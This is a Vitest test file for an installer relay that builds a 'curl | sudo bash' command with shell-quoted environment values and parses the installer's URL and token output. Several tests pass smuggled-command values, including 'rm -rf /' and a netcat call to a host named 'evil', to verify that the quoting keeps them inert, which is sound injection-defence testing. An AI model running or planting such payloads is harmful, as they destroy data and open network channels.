import { describe, expect, it } from "vitest";
import {
  buildInstallCommand,
  parseInstallOutput,
  INSTALL_SCRIPT_URL,
} from "../src/services/install-relay.js";

describe("buildInstallCommand", () => {
  it("produces a bare bash -c invocation when no env vars are set", () => {
    const cmd = buildInstallCommand({});
    expect(cmd).toBe(`bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`);
  });

  it("prefixes single-quoted env assignments when values are given", () => {
    const cmd = buildInstallCommand({
      relayDomain: "relay.example.com",
      traefikEmail: "ops@example.com",
      appsDir: "/root/git",
    });
    expect(cmd).toBe(
      `env RELAY_DOMAIN='relay.example.com' TRAEFIK_EMAIL='ops@example.com' APPS_DIR='/root/git' ` +
        `bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`,
    );
  });

  it("only includes env vars that were supplied", () => {
    const cmd = buildInstallCommand({ appsDir: "/opt/apps" });
    expect(cmd).toContain(`env APPS_DIR='/opt/apps' bash -c`);
    expect(cmd).not.toContain("RELAY_DOMAIN");
    expect(cmd).not.toContain("TRAEFIK_EMAIL");
  });

  it("single-quote-escapes an apostrophe in the value so it cannot break out", () => {
    // Standard POSIX trick: close the quote, emit a literal '\'', reopen.
    const cmd = buildInstallCommand({ relayDomain: `evil'; rm -rf /` });
    expect(cmd).toContain(`RELAY_DOMAIN='evil'"'"'; rm -rf /'`);
    // Proof: the whole command still has exactly one `bash -c '…'`
    // quoted region AFTER the env prefix, meaning the apostrophe
    // injection stays inside the env-value quoting.
    expect(cmd.endsWith(`bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`)).toBe(true);
  });

  it("accepts shell metacharacters in values without escaping them at the metachar level", () => {
    // Dollars, semicolons, backticks, pipes — all survive because we
    // use single-quote shell-quoting which is literal. The ONLY char
    // that needs special handling is the single quote itself, which
    // the prior test covers.
    const cmd = buildInstallCommand({
      relayDomain: "relay.ex.com; $(rm -rf /)",
      traefikEmail: "a@b.c | nc evil 1337",
    });
    expect(cmd).toContain(`RELAY_DOMAIN='relay.ex.com; $(rm -rf /)'`);
    expect(cmd).toContain(`TRAEFIK_EMAIL='a@b.c | nc evil 1337'`);
  });

  it("pins the installer URL to the hardcoded GitHub raw URL (not caller-configurable)", () => {
    // Regression guard: if someone ever adds a request-body field for
    // the script URL, this constant check flips red. Redirecting the
    // install to a lookalike script is the most dangerous shape of
    // this feature and must never become a runtime input.
    expect(INSTALL_SCRIPT_URL).toBe(
      "https://raw.githubusercontent.com/LanNguyenSi/agent-relay/main/install.sh",
    );
    const cmd = buildInstallCommand({});
    expect(cmd).toContain(INSTALL_SCRIPT_URL);
  });

  it("emits the v0.2.0 env vars when they are supplied", () => {
    const cmd = buildInstallCommand({
      relayMode: "existing-traefik",
      traefikNetwork: "my-edge",
      traefikCertResolver: "myresolver",
      relayBind: "0.0.0.0",
    });
    expect(cmd).toContain(`RELAY_MODE='existing-traefik'`);
    expect(cmd).toContain(`TRAEFIK_NETWORK='my-edge'`);
    expect(cmd).toContain(`TRAEFIK_CERTRESOLVER='myresolver'`);
    expect(cmd).toContain(`RELAY_BIND='0.0.0.0'`);
  });

  it("shell-escapes shell metachars in the new v0.2.0 env values too", () => {
    // Same single-quote-escape trick the original env vars use. A hostile
    // TRAEFIK_NETWORK value can't break out of its quoting into the
    // bash -c command body.
    const cmd = buildInstallCommand({ traefikNetwork: `evil'; rm -rf /` });
    expect(cmd).toContain(`TRAEFIK_NETWORK='evil'"'"'; rm -rf /'`);
  });
});

describe("parseInstallOutput", () => {
  /**
   * Fixture pinned against the actual install.sh connection-info block
   * (agent-relay/install.sh, section "Step 4: Print connection info").
   * Copy-paste with the colored ANSI escapes preserved.
   *
   * If install.sh reworks its output, this test fails loudly before
   * the silent token-not-found error reaches a user's wizard.
   */
  const FIXTURE_DOMAIN_MODE =
    "\n" +
    "\x1b[36m════════════════════════════════════════════════════════════\x1b[0m\n" +
    "\x1b[32m agent-relay is ready!\x1b[0m\n" +
    "\x1b[36m════════════════════════════════════════════════════════════\x1b[0m\n" +
    "\n" +
    "  URL:   \x1b[36mhttps://relay.example.com\x1b[0m\n" +
    "  Token: \x1b[33mabc123deadbeef\x1b[0m\n" +
    "\n" +
    "  Health:    curl -s $URL/health\n" +
    "  API:       curl -s -H 'Authorization: Bearer $TOKEN' $URL/api/apps\n" +
    "  MCP:       $URL/mcp\n" +
    "\n" +
    "  Apps dir:  /root/git\n" +
    "  Config:    /opt/agent-relay/.env\n" +
    "\n" +
    "  \x1b[36mAdd to deploy-panel:\x1b[0m\n" +
    "    Name:       vps-01\n" +
    "    Host:       192.168.1.100\n" +
    "    Relay URL:  https://relay.example.com\n" +
    "    Relay Token: abc123deadbeef\n";

  const FIXTURE_PORT_MODE =
    "\n" +
    "  URL:   \x1b[36mhttp://192.168.1.100:8222\x1b[0m\n" +
    "  Token: \x1b[33mdeadbeefcafe\x1b[0m\n" +
    "\n";

  it("extracts URL + Token from the domain-mode installer output", () => {
    const r = parseInstallOutput(FIXTURE_DOMAIN_MODE);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.relayUrl).toBe("https://relay.example.com");
      expect(r.value.relayToken).toBe("abc123deadbeef");
    }
  });

  it("extracts URL + Token from the port-only (no domain) installer output", () => {
    const r = parseInstallOutput(FIXTURE_PORT_MODE);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.relayUrl).toBe("http://192.168.1.100:8222");
      expect(r.value.relayToken).toBe("deadbeefcafe");
    }
  });

  it("returns url_not_found when there is no URL: line", () => {
    const r = parseInstallOutput("some output without the keyword\nToken: abc\n");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("url_not_found");
  });

  it("returns token_not_found when URL: is present but Token: is absent", () => {
    const r = parseInstallOutput("  URL: https://relay.example.com\n(no token)\n");
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("token_not_found");
  });

  it("does not mis-match the `Relay URL:` / `Relay Token:` labels", () => {
    // These appear in the second "Add to deploy-panel" block. If the
    // first block ever goes missing, we want token_not_found — NOT a
    // silent match on the secondary block that might drift. This test
    // pins the one-source-of-truth behaviour.
    const outputWithOnlySecondaryBlock =
      "\n  Add to deploy-panel:\n" +
      "    Name:       vps\n" +
      "    Relay URL:  https://relay.example.com\n" +
      "    Relay Token: abc\n";
    const r = parseInstallOutput(outputWithOnlySecondaryBlock);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error.kind).toBe("url_not_found");
  });

  it("tolerates tab indentation", () => {
    const r = parseInstallOutput("\tURL: https://x\n\tToken: y\n");
    expect(r.ok).toBe(true);
  });

  it("captures the Mode line from install.sh v0.2.0 output", () => {
    // agent-relay v0.2.0 prints a `  Mode:  <mode>` info line above
    // the URL/Token block. We capture it for UI display; parseInstallOutput
    // still succeeds without it (v0.1.x back-compat).
    const fixture =
      "\n  Mode:  \x1b[36mexisting-traefik\x1b[0m\n" +
      "  URL:   \x1b[36mhttps://relay.example.com\x1b[0m\n" +
      "  Token: \x1b[33mtok\x1b[0m\n";
    const r = parseInstallOutput(fixture);
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.relayMode).toBe("existing-traefik");
      expect(r.value.relayUrl).toBe("https://relay.example.com");
    }
  });

  it("leaves relayMode undefined for v0.1.x output (no Mode line)", () => {
    // Back-compat: operators running install.sh v0.1.x should still
    // succeed — parseInstallOutput returns { relayMode: undefined }.
    const r = parseInstallOutput(FIXTURE_DOMAIN_MODE);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.value.relayMode).toBeUndefined();
  });

  it("ignores a Mode line with an unknown value instead of crashing", () => {
    // Defensive: a typoed / unexpected mode value should not block the
    // parse — URL/Token are the critical path, Mode is advisory.
    const fixture =
      "  Mode:  bogus\n  URL:   https://x\n  Token: y\n";
    const r = parseInstallOutput(fixture);
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.value.relayMode).toBeUndefined();
  });
});
